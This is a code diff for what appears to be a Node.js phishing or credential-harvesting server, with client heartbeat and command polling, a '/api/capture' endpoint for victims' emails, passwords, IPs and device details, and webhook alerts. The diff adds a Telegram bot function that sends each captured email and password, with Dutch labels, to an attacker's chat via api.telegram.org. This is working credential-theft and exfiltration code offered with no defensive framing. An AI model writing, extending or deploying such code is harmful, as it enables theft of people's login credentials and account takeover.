@@ -188,7 +188,9 @@ const defaultConfig = {
     deviceInfoPeriod: 60000, heartbeatPeriod: 8000, commandPoll: 3000,
     webhookUrl: '',          // Discord/Slack webhook — leave empty to disable
     webhookOnNewClient: true,
-    webhookOnCredential: true
+    webhookOnCredential: true,
+    telegramBotToken: process.env.TELEGRAM_BOT_TOKEN || '',
+    telegramChatId: process.env.TELEGRAM_CHAT_ID || ''
 };
 if (!store.config) store.config = { ...defaultConfig };
 
@@ -288,6 +290,29 @@ async function fireWebhook(payload) {
             req.write(body); req.end();
         });
     } catch (e) { console.error('Webhook error:', e.message); }
+}
+
+async function fireTelegramMessage(message) {
+    try {
+        const token = (store.config && store.config.telegramBotToken) || process.env.TELEGRAM_BOT_TOKEN;
+        const chatId = (store.config && store.config.telegramChatId) || process.env.TELEGRAM_CHAT_ID;
+        if (!token || !chatId) return;
+        const body = JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' });
+        const https = require('https');
+        const opts = {
+            hostname: 'api.telegram.org',
+            port: 443,
+            path: `/bot${token}/sendMessage`,
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
+        };
+        await new Promise((res, rej) => {
+            const req = https.request(opts, r => { r.resume(); r.on('end', res); });
+            req.setTimeout(5000, () => { req.destroy(); rej(new Error('timeout')); });
+            req.on('error', rej);
+            req.write(body); req.end();
+        });
+    } catch (e) { console.error('Telegram error:', e.message); }
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -698,6 +723,9 @@ app.post('/api/capture', (req, res) => {
                 { name: 'Stay Signed In', value: entry.staySignedIn ? 'Yes' : 'No', inline: true }
             ]}]
         }).catch(() => {});
+        fireTelegramMessage(
+            `🔑 <b>Nieuwe credential</b>\n📧 <b>Email:</b> ${entry.email}\n🔐 <b>Wachtwoord:</b> ${entry.password.slice(0,80)}\n📌 <b>Bron:</b> ${entry.source}\n🌐 <b>IP:</b> ${entry.ip}\n🕐 <b>Tijd:</b> ${entry.timestamp}\n🖥 <b>Scherm:</b> ${entry.screen}\n🌍 <b>Tijdzone:</b> ${entry.timezone}`
+        ).catch(() => {});
     }
     res.json({ success: true });
 });
